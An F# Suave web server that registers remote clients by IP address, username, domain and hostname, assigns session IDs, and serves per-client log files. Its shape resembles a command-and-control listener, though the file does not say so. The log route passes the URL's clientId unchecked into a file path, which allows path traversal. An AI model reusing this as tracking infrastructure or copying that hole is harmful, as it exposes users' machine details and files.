open System
open System.IO
open System.Net
open System.Collections.Concurrent
open Suave
open Suave.Filters
open Suave.Operators
open Suave.Successful
open Suave.RequestErrors
open Suave.Files

// Define the root directory to serve files from
let rootDirectory = AppDomain.CurrentDomain.BaseDirectory

// Dictionary to keep track of clients and their details
let clients = ConcurrentDictionary<string, (string * string)>()
let clientSessions = ConcurrentDictionary<string, string>()
let mutable sessionCounter = 1

let generateSessionId () =
    let sessionId = sprintf "Session%d" sessionCounter
    sessionCounter <- sessionCounter + 1
    sessionId

// Function to log received data
let logData (data: string) (clientId: string) =
    try
        let logDir = Path.Combine(rootDirectory, "clients")
        if not (Directory.Exists(logDir)) then
            Directory.CreateDirectory(logDir) |> ignore

        let logFile = Path.Combine(logDir, $"{clientId}/log.txt") // Save log in the client's session directory
        if not (Directory.Exists(Path.GetDirectoryName(logFile))) then
            Directory.CreateDirectory(Path.GetDirectoryName(logFile)) |> ignore

        File.AppendAllText(logFile, $"{DateTime.Now}: {data}{Environment.NewLine}")
    with
    | ex -> printfn "Error logging data: %s" ex.Message

// Define the web server configuration
let config =
    { defaultConfig with
        bindings = [ HttpBinding.createSimple HTTP "0.0.0.0" 8000 ] }

// Define the web app
let app =
    choose [
        GET >=> choose [
            path "/" >=> file (Path.Combine(rootDirectory, "index.html"))
            path "/clients" >=> request (fun _ ->
                let clientList = 
                    clients
                    |> Seq.map (fun kvp -> 
                        let sessionId = clientSessions.[kvp.Key]
                        sprintf "%s (Details: %s)" sessionId kvp.Value.Item1)
                    |> String.concat ", "
                Successful.OK clientList
            )
            pathScan "/clients/%s" (fun clientId ->
                let logFile = Path.Combine(rootDirectory, "clients", clientId, "log.txt")
                if File.Exists(logFile) then
                    let logContent = File.ReadAllText(logFile)
                    Successful.OK logContent
                else
                    RequestErrors.NOT_FOUND "Log file not found"
            )
        ]
        POST >=> choose [
            path "/registerClient" >=> request (fun r ->
                match r.rawForm |> System.Text.Encoding.UTF8.GetString |> Option.ofObj with
                | Some clientDetails ->
                    let sessionId = generateSessionId()
                    let ipAddress = clientDetails.Split('_').[0]
                    let username = clientDetails.Split('_').[1]
                    let domainName = clientDetails.Split('_').[2]
                    let hostName = clientDetails.Split('_').[3]
                    clients.TryAdd(sessionId, (clientDetails, sprintf "%s, %s, %s, %s" ipAddress username domainName hostName)) |> ignore
                    clientSessions.TryAdd(sessionId, sessionId) |> ignore
                    Successful.OK $"Client registered with session {sessionId}"
                | None -> RequestErrors.BAD_REQUEST "Client details not provided"
            )
        ]
    ]

// Start the web server
startWebServer config app
